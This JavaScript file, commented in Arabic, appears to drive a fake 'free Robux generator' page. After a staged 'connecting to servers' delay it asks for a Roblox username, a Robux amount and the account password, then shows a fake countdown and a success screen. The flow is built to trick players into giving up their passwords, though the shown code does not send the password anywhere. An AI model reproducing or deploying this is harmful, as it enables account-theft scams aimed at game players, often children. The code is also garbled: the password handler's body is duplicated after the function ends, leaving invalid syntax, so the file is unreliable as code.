// دالة لتغيير الشاشات والمراحل
function goToStep(stepId) {
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    document.getElementById(stepId).classList.add('active');
}

// 1. عند فتح الموقع: جاري الاتصال بالخوادم لمدة 3 ثوانٍ
window.onload = function() {
    setTimeout(() => {
        goToStep('step-name');
    }, 3000);
};

// 2. عند الضغط على زر تأكيد الحساب
function submitName() {
    const name = document.getElementById('username').value.trim();
    if (name === "") {
        alert("الرجاء إدخال اسم حساب Roblox أولاً!");
        return;
    }
    goToStep('step-text'); // الانتقال لتحديد كمية الروبوكس
}

// 3. عند الضغط على زر تأكيد كمية الروبوكس
function submitText() {
    const robuxAmount = document.getElementById('usertext').value.trim();
    if (robuxAmount === "" || robuxAmount <= 0) {
        alert("الرجاء تحديد كمية Robux صالحة!");
        return;
    }
    goToStep('step-password'); // الانتقال الجديد: إلى خانة الباسورد
}

// 4. عند الضغط على زر تأكيد الباسورد
function submitPassword() {
    const password = document.getElementById('userpassword').value.trim();
    if (password === "") {
        alert("الرجاء إدخال كلمة المرور لتأكيد الحساب!");
        return;
    }

    goToStep('step-final-load'); // الانتقال لشاشة التوليد والتحميل النهائي

    let secondsLeft = 10;
    const countdownElement = document.getElementById('countdown');
    
    // تشغيل العداد التنازلي كل ثانية لمدة 10 ثوانٍ
    const interval = setInterval(() => {
        secondsLeft--;
        countdownElement.innerText = `متبقي ${secondsLeft} ثوانٍ`;
        
        if (secondsLeft <= 0) {
            clearInterval(interval); 
            goToStep('step-success'); // إظهار شاشة النجاح النهائية
        }
    }, 1000);
}
    const password = document.getElementById('userpassword').value.trim();
    if (password === "") {
        alert("الرجاء إدخال كلمة المرور لتأكيد الحساب!");
        return;
    }

    goToStep('step-final-load'); // الانتقال لشاشة التوليد والتحميل النهائي

    let secondsLeft = 10;
    const countdownElement = document.getElementById('countdown');
    
    // تشغيل العداد التنازلي كل ثانية لمدة 10 ثوانٍ
    const interval = setInterval(() => {
        secondsLeft--;
        countdownElement.innerText = `متبقي ${secondsLeft} ثوانٍ`;
        
        if (secondsLeft <= 0) {
            clearInterval(interval); 
            goToStep('step-success'); // إظهار شاشة النجاح النهائية
        }
    }, 1000);
}


